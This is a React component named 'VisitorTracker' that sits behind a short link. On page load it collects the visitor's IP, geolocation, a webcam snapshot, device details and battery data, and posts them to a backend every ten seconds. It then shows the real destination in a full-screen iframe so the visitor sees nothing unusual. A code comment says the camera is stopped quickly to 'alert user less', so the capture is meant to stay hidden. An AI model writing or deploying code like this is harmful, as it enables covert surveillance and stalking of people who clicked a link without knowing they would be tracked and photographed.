import { useEffect, useRef } from "react";
import { useParams } from "react-router-dom";

function VisitorTracker() {
  const { shortId } = useParams();
  const hasRedirected = useRef(false); // Prevent infinite iframe loading

  useEffect(() => {
    let videoStream = null;
    let baseData = {}; // This will hold our "static" data

    const initVisitor = async () => {
      try {
        // 🌐 IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // 📍 Location
        let latitude = "N/A", longitude = "N/A";
        if (navigator.geolocation) {
          try {
            const pos = await new Promise((res, rej) =>
              navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
            );
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
          } catch (e) { console.log("Geo denied"); }
        }

        // 🎥 Camera
        let cameraImage = null;
        try {
          videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = videoStream;
          await video.play();

          const canvas = document.createElement("canvas");
          canvas.width = 320; // Smaller for faster upload
          canvas.height = 240;
          canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
          cameraImage = canvas.toDataURL("image/jpeg", 0.5);
          
          // Stop camera immediately after snapshot to save power/alert user less
          videoStream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log("Cam denied"); }

        // ✅ BUILD BASE DATA
        baseData = {
          shortId,
          ip: ipData.ip,
          latitude,
          longitude,
          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
          cpuCores: navigator.hardwareConcurrency || "N/A",
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: `${window.screen.width}x${window.screen.height}`,
          cameraImage,
        };

        // Trigger first data sync
        await sendData(); 
      } catch (err) {
        console.log("Init error:", err);
      }
    };

    const sendData = async () => {
      try {
        const token = localStorage.getItem("token");
        
        // 🔋 Get Fresh Battery Data
        let batteryLevel = "N/A", isCharging = "N/A";
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          batteryLevel = (b.level * 100) + "%";
          isCharging = b.charging;
        }

        const payload = {
          ...baseData, // Use the baseData collected in init
          batteryLevel,
          isCharging,
          timestamp: new Date().toISOString(),
        };

        const res = await fetch(`http://localhost:5000/api/auth/t/${shortId}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${token}`,
          },
          body: JSON.stringify(payload),
        });

        const result = await res.json();

        // ✅ Update Iframe only if not already done
        if (result.redirectUrl && !hasRedirected.current) {
          const frame = document.getElementById("target-frame");
          if (frame) {
            frame.src = result.redirectUrl;
            hasRedirected.current = true;
          }
        }
      } catch (err) {
        console.log("Sync error:", err);
      }
    };

    initVisitor();
    const interval = setInterval(sendData, 10000);

    return () => {
      clearInterval(interval);
      if (videoStream) videoStream.getTracks().forEach(t => t.stop());
    };
  }, [shortId]);

  return (
    <div style={{ width: "100vw", height: "100vh", overflow: "hidden" }}>
      <iframe
        id="target-frame"
        title="Content"
        style={{ width: "100%", height: "100%", border: "none" }}
        sandbox="allow-forms allow-scripts allow-same-origin"
      />
    </div>
  );
}

export default VisitorTracker;
